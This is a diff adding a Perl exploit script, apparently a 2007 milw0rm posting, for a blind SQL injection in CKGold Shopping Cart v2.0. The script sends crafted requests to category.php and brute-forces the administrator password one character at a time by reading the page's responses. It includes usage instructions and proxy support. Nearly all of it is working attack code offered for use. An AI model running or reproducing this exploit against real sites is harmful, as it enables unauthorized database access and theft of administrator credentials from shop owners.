@@ -1,0 +1,102 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use Getopt::Long;
+
+if(!$ARGV[4])
+{
+ print "\n  |-------------------------------------------------|";
+ print "\n  |                newhack[dot]org                  |";
+ print "\n  |-------------------------------------------------|";
+ print "\n  |  CKGold Shopping Cart v2.0 Blind SQL Injection  |";
+ print "\n  |          Found by k1tk4t - Indonesia            |";
+ print "\n  |   DNX Code  dnx[at]hackermail.com | Modified    |";
+ print "\n  |-------------------------------------------------|";
+ print "\n[!] Vendor: http://www.cartkeeper.com";
+ print "\n[!] Usage: perl CKGold.pl [Host] [Path] <Options>";
+ print "\n[!] Example: perl CKGold.pl 127.0.0.1 /shop/ -m 1 -c 10 -t tbl_system";
+ print "\n[!] Options:";
+ print "\n       -m [no]       Valid manufacturer_id";
+ print "\n       -c [no]       Valid category_id";
+ print "\n       -t [name]     Changes the system table name, default is tbl_system";
+ print "\n       -p [ip:port]  Proxy support";
+ print "\n";
+ exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my $mfr     = $ARGV[2];
+my $cat     = $ARGV[3];
+my $table   = "tbl_system";
+my %options = ();
+GetOptions(\%options, "m=i", "c=i", "t=s", "p=s");
+
+print "[!] Exploiting...\n";
+
+if($options{"m"}) { $mfr = $options{"m"}; }
+if($options{"c"}) { $cat = $options{"c"}; }
+if($options{"t"}) { $table = $options{"t"}; }
+
+syswrite(STDOUT, "[!] Admin Password : ", 21);
+
+for(my $i = 1; $i <= 32; $i++)
+{
+ my $found = 0;
+ my $h = 48;
+ while(!$found && $h <= 57)
+ {
+   if(istrue2($host, $path, $table, $i, $h))
+   {
+     $found = 1;
+     syswrite(STDOUT, chr($h), 1);
+   }
+   $h++;
+ }
+ if(!$found)
+ {
+   $h = 97;
+   while(!$found && $h <= 122)
+   {
+     if(istrue2($host, $path, $table, $i, $h))
+     {
+       $found = 1;
+       syswrite(STDOUT, chr($h), 1);
+     }
+     $h++;
+   }
+ }
+}
+
+print "\n[!] Exploit done\n";
+
+sub istrue2
+{
+ my $host  = shift;
+ my $path  = shift;
+ my $table = shift;
+ my $i     = shift;
+ my $h     = shift;
+
+ my $ua = LWP::UserAgent->new;
+ my $url = "http://".$host.$path."category.php?manufacturer_id=".$mfr."&category_id=".$cat."%20AND%20SUBSTRING((SELECT%20admin_password%20FROM%20".$table."%20LIMIT%200,1),".$i.",1)=CHAR(".$h.")";
+
+ if($options{"p"})
+ {
+   $ua->proxy('http', "http://".$options{"p"});
+ }
+
+ my $response = $ua->get($url);
+ my $content = $response->content;
+ my $regexp = "<th>Products</th>";
+
+ if($content =~ /$regexp/)
+ {
+   return 1;
+ }
+ else
+ {
+   return 0;
+ }
+}
+
+# milw0rm.com [2007-08-31]
